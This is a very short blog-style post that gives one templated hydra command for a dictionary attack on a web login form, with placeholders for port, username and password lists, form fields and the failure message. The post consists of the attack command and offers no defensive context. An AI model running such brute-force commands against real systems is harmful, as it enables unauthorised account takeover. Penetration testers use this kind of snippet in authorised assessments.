---
layout: post
title:  Hydra webform attack
categories: [Code, Linux, Hydra]
---

### This is a code snippet for a dictionary attack on a webform

```
hydra 99.0.4.3 -s <PORT> -l <LOGIN/LOGINS LIST> -P <PASSWORD/PASSWORD LIST>  http-post-form "<form url>:username=^USER^&password=^PASS^&submit=Submit:<fail message>"
```
